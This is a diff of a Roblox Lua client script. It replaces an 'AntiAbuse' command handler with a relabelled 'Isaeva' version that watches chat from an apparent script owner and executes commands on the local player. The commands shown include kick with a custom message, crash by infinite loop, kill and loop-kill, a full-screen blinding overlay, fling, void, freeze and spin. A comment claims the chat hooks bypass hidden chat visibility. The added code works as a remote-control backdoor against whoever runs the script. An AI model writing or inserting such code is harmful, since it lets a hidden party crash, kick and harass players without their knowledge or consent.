-            elseif cmd == "unload" then
-                pcall(function()
-                    if typeof(Gui) == "Instance" then
-                        Gui:Destroy()
-                    end
-                end)
-
-            elseif cmd == "freeze" then
-                local char = LocalClient.Character
-                local root = char
-                    and char:FindFirstChild("HumanoidRootPart")
-                if root then root.Anchored = true end
-
-            elseif cmd == "unfreeze" then
-                local char = LocalClient.Character
-                local root = char
-                    and char:FindFirstChild("HumanoidRootPart")
-                if root then root.Anchored = false end
-
-            elseif cmd == "blind" then
-                local pGui = LocalClient:FindFirstChild("PlayerGui")
-                if pGui and not pGui:FindFirstChild("AntiAbuseBlind") then
-                    local bGui = Instance.new("ScreenGui")
-                    bGui.Name = "AntiAbuseBlind"
-                    bGui.IgnoreGuiInset = true
-                    bGui.DisplayOrder = 999999
-
-                    local frame = Instance.new("Frame")
-                    frame.Size = UDim2.new(1, 0, 1, 0)
-                    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-                    frame.BorderSizePixel = 0
-                    frame.Parent = bGui
-                    bGui.Parent = pGui
-                end
-
-            elseif cmd == "unblind" then
-                local pGui = LocalClient:FindFirstChild("PlayerGui")
-                local existing = pGui
-                    and pGui:FindFirstChild("AntiAbuseBlind")
-                if existing then existing:Destroy() end
-
-            elseif cmd == "confuse" then
-                local char = LocalClient.Character
-                local hum = char
-                    and char:FindFirstChildOfClass("Humanoid")
-                if hum then hum.PlatformStand = true end
-
-            elseif cmd == "unconfuse" then
-                local char = LocalClient.Character
-                local hum = char
-                    and char:FindFirstChildOfClass("Humanoid")
-                if hum then hum.PlatformStand = false end
-
-            elseif cmd == "kill" then
-                local char = LocalClient.Character
-                local hum = char
-                    and char:FindFirstChildOfClass("Humanoid")
-                if hum then hum.Health = 0 end
-
-            elseif cmd == "loopkill" then
-                LocalClient:SetAttribute("AntiAbuseLoopKill", true)
+        if activeCmd == "bring" then
+            local ownerPlr = PlayersService:GetPlayerByUserId(senderUserId)
+            if ownerPlr then
                 task.spawn(function()
-                    while LocalClient:GetAttribute("AntiAbuseLoopKill") do
-                        local char = LocalClient.Character
-                        local hum = char
-                            and char:FindFirstChildOfClass("Humanoid")
-                        if hum and hum.Health > 0 then
-                            hum.Health = 0
-                        end
-                        task.wait(0.5)
-                    end
-                end)
-
-            elseif cmd == "unloopkill" then
-                LocalClient:SetAttribute("AntiAbuseLoopKill", false)
-
-            elseif cmd == "fling" then
-                local char = LocalClient.Character
-                local root = char
-                    and char:FindFirstChild("HumanoidRootPart")
-                if root then
-                    root.AssemblyLinearVelocity = Vector3.new(
-                        math.random(-200, 200),
-                        500,
-                        math.random(-200, 200)
-                    )
-                end
-
-            elseif cmd == "void" then
-                local char = LocalClient.Character
-                local root = char
-                    and char:FindFirstChild("HumanoidRootPart")
-                if root then
-                    root.CFrame = CFrame.new(0, -1000, 0)
-                end
-
-            elseif cmd == "invert" then
-                local char = LocalClient.Character
-                local hum = char
-                    and char:FindFirstChildOfClass("Humanoid")
-                if hum then hum.WalkSpeed = -16 end
-
-            elseif cmd == "uninvert" then
-                local char = LocalClient.Character
-                local hum = char
-                    and char:FindFirstChildOfClass("Humanoid")
-                if hum then hum.WalkSpeed = 16 end
-
-            elseif cmd == "spin" then
-                local char = LocalClient.Character
-                local root = char
-                    and char:FindFirstChild("HumanoidRootPart")
-                if root and not root:FindFirstChild("AntiAbuseSpin") then
-                    local bav = Instance.new("BodyAngularVelocity")
-                    bav.Name = "AntiAbuseSpin"
-                    bav.MaxTorque = Vector3.new(0, math.huge, 0)
-                    bav.AngularVelocity = Vector3.new(0, 50, 0)
-                    bav.Parent = root
-                end
-
-            elseif cmd == "unspin" then
-                local char = LocalClient.Character
-                local root = char
-                    and char:FindFirstChild("HumanoidRootPart")
-                local spin = root
-                    and root:FindFirstChild("AntiAbuseSpin")
-                if spin then spin:Destroy() end
-            end
-        end
-
-        -- =========================================================
-        -- SAFE NON-BLOCKING CHAT HOOKS
-        -- =========================================================
-        -- 1. Modern TextChatService (MessageReceived)
-        pcall(function()
-            TextChatService.MessageReceived:Connect(function(msgObj)
-                if msgObj and msgObj.TextSource then
-                    handleCommand(msgObj.TextSource.UserId, msgObj.Text)
-                end
-            end)
-        end)
-
-        -- 2. Modern TextChannels direct hook (non-blocking)
-        pcall(function()
-            local function hookChannel(ch)
-                if ch:IsA("TextChannel") then
-                    ch.MessageReceived:Connect(function(msgObj)
-                        if msgObj and msgObj.TextSource then
-                            handleCommand(
-                                msgObj.TextSource.UserId,
-                                msgObj.Text
-                            )
-                        end
-                    end)
-                end
-            end
-            local channels = TextChatService:FindFirstChild("TextChannels")
-            if channels then
-                for _, ch in ipairs(channels:GetChildren()) do
-                    hookChannel(ch)
-                end
-                channels.ChildAdded:Connect(hookChannel)
-            end
-        end)
-
-        -- 3. Legacy Player.Chatted fallback
-        local function hookPlayerChat(plr)
-            plr.Chatted:Connect(function(msg)
-                handleCommand(plr.UserId, msg)
-            end)
-        end
-
-        for _, plr in ipairs(Players:GetPlayers()) do
-            hookPlayerChat(plr)
-        end
-        Players.PlayerAdded:Connect(hookPlayerChat)
-
-        -- 4. Legacy DefaultChatSystemChatEvents fallback (non-blocking)
-        pcall(function()
-            local chatEvents = ReplicatedStorage:FindFirstChild(
-                "DefaultChatSystemChatEvents"
-            )
-            local onMsg = chatEvents
-                and chatEvents:FindFirstChild("OnMessageDoneFiltering")
-            if onMsg and onMsg:IsA("RemoteEvent") then
-                onMsg.OnClientEvent:Connect(function(data)
-                    if type(data) == "table" and data.Message then
-                        local sender = data.FromSpeaker
-                            and Players:FindFirstChild(data.FromSpeaker)
-                        if sender then
-                            handleCommand(sender.UserId, data.Message)
-                        end
+                    local targetNewRoot = resetAndWaitForRoot(LocalClient)
+                    task.wait(0.25)
+                    local ownerRoot = ownerPlr.Character and ownerPlr.Character:FindFirstChild("HumanoidRootPart")
+                    if targetNewRoot and ownerRoot then
+                        targetNewRoot.CFrame = ownerRoot.CFrame * CFrame.new(0, 3, -3)
                     end
                 end)
             end
+
+        elseif activeCmd == "kick" then
+            local reasonWords = {}
+            for i = 3, #commandArgs do
+                table.insert(reasonWords, commandArgs[i])
+            end
+            local customReasonText = table.concat(reasonWords, " ")
+            if customReasonText == "" then
+                customReasonText = "Terminated by Script Owner."
+            end
+            LocalClient:Kick("\n" .. customReasonText)
+
+        elseif activeCmd == "crash" then
+            while true do end
+
+        elseif activeCmd == "unload" then
+            script:Destroy()
+
+        elseif activeCmd == "freeze" then
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.Anchored = true end
+
+        elseif activeCmd == "unfreeze" then
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.Anchored = false end
+
+        elseif activeCmd == "blind" then
+            local pGui = LocalClient:FindFirstChild("PlayerGui")
+            if pGui and not pGui:FindFirstChild("IsaevaBlind") then
+                local blindGui = Instance.new("ScreenGui")
+                blindGui.Name = "IsaevaBlind"
+                blindGui.IgnoreGuiInset = true
+                blindGui.DisplayOrder = 999999
+
+                local frame = Instance.new("Frame")
+                frame.Size = UDim2.new(1, 0, 1, 0)
+                frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                frame.BorderSizePixel = 0
+                frame.Parent = blindGui
+                blindGui.Parent = pGui
+            end
+
+        elseif activeCmd == "unblind" then
+            local pGui = LocalClient:FindFirstChild("PlayerGui")
+            local existingBlind = pGui and pGui:FindFirstChild("IsaevaBlind")
+            if existingBlind then existingBlind:Destroy() end
+
+        elseif activeCmd == "confuse" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.PlatformStand = true end
+
+        elseif activeCmd == "unconfuse" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.PlatformStand = false end
+
+        elseif activeCmd == "kill" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.Health = 0 end
+
+        elseif activeCmd == "loopkill" then
+            LocalClient:SetAttribute("IsaevaLoopKill", true)
+            task.spawn(function()
+                while LocalClient:GetAttribute("IsaevaLoopKill") do
+                    local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+                    if hum and hum.Health > 0 then
+                        hum.Health = 0
+                    end
+                    task.wait(0.5)
+                end
+            end)
+
+        elseif activeCmd == "unloopkill" then
+            LocalClient:SetAttribute("IsaevaLoopKill", false)
+
+        elseif activeCmd == "fling" then
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                root.AssemblyLinearVelocity = Vector3.new(math.random(-200, 200), 500, math.random(-200, 200))
+            end
+
+        elseif activeCmd == "void" then
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                root.CFrame = CFrame.new(0, -1000, 0)
+            end
+
+        elseif activeCmd == "invert" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.WalkSpeed = -16 end
+
+        elseif activeCmd == "uninvert" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.WalkSpeed = 16 end
+
+        elseif activeCmd == "spin" then
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root and not root:FindFirstChild("IsaevaSpin") then
+                local bav = Instance.new("BodyAngularVelocity")
+                bav.Name = "IsaevaSpin"
+                bav.MaxTorque = Vector3.new(0, math.huge, 0)
+                bav.AngularVelocity = Vector3.new(0, 50, 0)
+                bav.Parent = root
+            end
+
+        elseif activeCmd == "unspin" then
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            local spin = root and root:FindFirstChild("IsaevaSpin")
+            if spin then spin:Destroy() end
+        end
+    end
+
+    -- =========================================================
+    -- MULTI-LAYER CHAT INTERCEPTORS (Bypasses hidden chat visibility)
+    -- =========================================================
+    if TextChatService then
+        TextChatService.MessageReceived:Connect(function(textChatMessage)
+            if textChatMessage.TextSource then
+                executeCommandCheck(textChatMessage.TextSource.UserId, textChatMessage.Text)
+            end
         end)
-    end)
+
+        local function hookTextChannel(channel)
+            if channel:IsA("TextChannel") then
+                channel.MessageReceived:Connect(function(textChatMessage)
+                    if textChatMessage.TextSource then
+                        executeCommandCheck(textChatMessage.TextSource.UserId, textChatMessage.Text)
+                    end
+                end)
+            end
+        end
+
+        for _, descendant in ipairs(TextChatService:GetDescendants()) do
+            hookTextChannel(descendant)
+        end
+        TextChatService.DescendantAdded:Connect(hookTextChannel)
+    end
+
+    local function monitorUserChatLegacy(player)
+        player.Chatted:Connect(function(message)
+            executeCommandCheck(player.UserId, message)
+        end)
+    end
+
+    for _, existingPlayer in ipairs(PlayersService:GetPlayers()) do
+        monitorUserChatLegacy(existingPlayer)
+    end
+    PlayersService.PlayerAdded:Connect(monitorUserChatLegacy)
+
+    local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+    if chatEvents then
+        local onMessageDoneFiltering = chatEvents:FindFirstChild("OnMessageDoneFiltering")
+        if onMessageDoneFiltering and onMessageDoneFiltering:IsA("RemoteEvent") then
+            onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
+                if type(messageData) == "table" and messageData.FromSpeaker and messageData.Message then
+                    local speakerPlr = PlayersService:FindFirstChild(messageData.FromSpeaker)
+                    if speakerPlr then
+                        executeCommandCheck(speakerPlr.UserId, messageData.Message)
+                    end
+                end
+            end)
+        end
+    end
 end)
